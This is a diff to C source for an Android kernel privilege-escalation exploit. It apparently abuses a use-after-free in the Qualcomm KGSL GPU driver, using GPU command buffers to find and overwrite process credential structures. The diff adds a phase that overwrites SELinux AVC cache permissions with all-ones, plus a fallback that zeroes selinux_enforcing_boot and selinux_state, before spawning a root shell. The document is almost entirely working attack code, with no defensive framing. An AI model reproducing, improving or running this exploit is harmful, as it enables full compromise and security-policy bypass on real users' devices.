@@ -279,6 +279,7 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
+    
     printf("[*] Phase 6: GPU scan for cred pages (pattern 0x000007D0)\n");
     unsigned int ctx_id = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
@@ -290,7 +291,6 @@ int main(int argc, char **argv) {
     uint64_t dst_ga = 0, dst_flags = 0;
     gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
 
-    // スキャン範囲を 0x1000 から開始 (より広範囲)
     uint64_t scan_start = UAF_ADDR + 0x1000;
     uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
     uint64_t cred_pages[32];
@@ -322,7 +322,6 @@ int main(int argc, char **argv) {
 
         uint32_t *data = (uint32_t *)dst_m;
         int cred_off_found = -1;
-        // 緩和: 3個以上の 0x000007D0 で検出
         for (int i = 0; i < SCAN_DWORDS - 8; i++) {
             int cnt = 0;
             for (int j = 0; j < 8; j++)
@@ -351,7 +350,7 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
 
-        // uid, gid, euid, egid, suid, sgid, fsuid, fsgid を 0 に
+        
         uint64_t uid_base = cbase + 0x04;
         for (int i = 0; i < 8; i++) {
             uint32_t al, ah;
@@ -361,7 +360,7 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0;
         }
 
-        // capabilities (CapPrm, CapEff, CapInh, CapBnd) をフルに設定
+        
         uint64_t cap_base = cbase + 0x28;
         for (int i = 0; i < 4; i++) {
             uint32_t al, ah;
@@ -380,50 +379,121 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    // ===== SELinux を確実に無効化 =====
-    printf("[*] Phase 8: Disable SELinux (write enforcing_boot and state)\n");
-
-    // 1) selinux_enforcing_boot を 0 に
-    {
+    
+    printf("[*] Phase 8: GPU scan for AVC cache pages in UAF area\n");
+    uint64_t avc_vas[256];
+    int n_avc = 0;
+    
+    for (uint64_t va = scan_start; va < end_va && n_avc < 256; va += 0x1000) {
+        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
-        memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint32_t al, ah;
-        split64(selinux_enforcing_boot_addr, &al, &ah);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-        cmd[dw++] = al; cmd[dw++] = ah;
-        cmd[dw++] = 0;
+        for (int i = 0; i < AVC_SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i * 4, &dl, &dh);
+            split64(va + i * 4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0;
+            cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] selinux_enforcing_boot zeroed\n");
-    }
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
+        __sync_synchronize();
 
-    // 2) selinux_state の先頭 0x20 バイトをゼロクリア (enforcing フラグを含む)
-    {
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int off = 0; off < 0x20; off += 4) {
-            uint64_t addr = selinux_state_addr + off;
+        uint32_t *d = (uint32_t *)dst_m;
+        int ahits = 0;
+        for (int ofs = 0; ofs < 4032; ofs += 72) {
+            int idx = ofs / 4;
+            if (idx + 13 >= AVC_SCAN_DWORDS) break;
+            uint32_t ssid = d[idx];
+            uint32_t tsid = d[idx+1];
+            uint32_t tclass = d[idx+2] & 0xFFFF;
+            uint32_t pprev_hi = d[idx+13];
+            if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
+                tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
+                ahits++;
+            }
+        }
+        if (ahits >= 3) {
+            printf("\n  [AVC] va=0x%lx ahits=%d\n", (unsigned long)va, ahits);
+            avc_vas[n_avc] = va;
+            n_avc++;
+        }
+    }
+    printf("\n[*] Found %d AVC pages\n", n_avc);
+
+    if (n_avc > 0) {
+        printf("[*] Phase 8b: Overwrite AVC allowed fields (0xFFFFFFFF)\n");
+        for (int p = 0; p < n_avc; p++) {
+            memset(ib_m, 0, 0x10000);
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int slot = 0; slot < 4032; slot += 72) {
+                uint64_t allowed_addr = avc_vas[p] + slot + 12;
+                uint32_t al, ah;
+                split64(allowed_addr, &al, &ah);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+                cmd[dw++] = al; cmd[dw++] = ah;
+                cmd[dw++] = 0xFFFFFFFF;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+        }
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] AVC allowed overwritten (SELinux should be effectively permissive)\n");
+    } else {
+        printf("[-] No AVC pages found, fallback to direct kernel variable zeroing\n");
+        {
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            uint64_t addr = selinux_enforcing_boot_addr;
             uint32_t al, ah;
             split64(addr, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
             cmd[dw++] = al; cmd[dw++] = ah;
             cmd[dw++] = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+            printf("[+] Fallback: selinux_enforcing_boot zeroed\n");
         }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] selinux_state zeroed (first 0x20 bytes)\n");
+        {
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int off = 0; off < 0x20; off += 4) {
+                uint64_t addr = selinux_state_addr + off;
+                uint32_t al, ah;
+                split64(addr, &al, &ah);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+                cmd[dw++] = al; cmd[dw++] = ah;
+                cmd[dw++] = 0;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+            printf("[+] Fallback: selinux_state zeroed (first 0x20 bytes)\n");
+        }
     }
 
     printf("[*] Phase 9: Cache eviction\n");
@@ -447,7 +517,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0, SELinux should be permissive) - type exit to quit\n  # ");
+        printf("\n  # ROOT SHELL (uid=0, SELinux effectively permissive via AVC) - type exit to quit\n  # ");
         fflush(stdout);
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
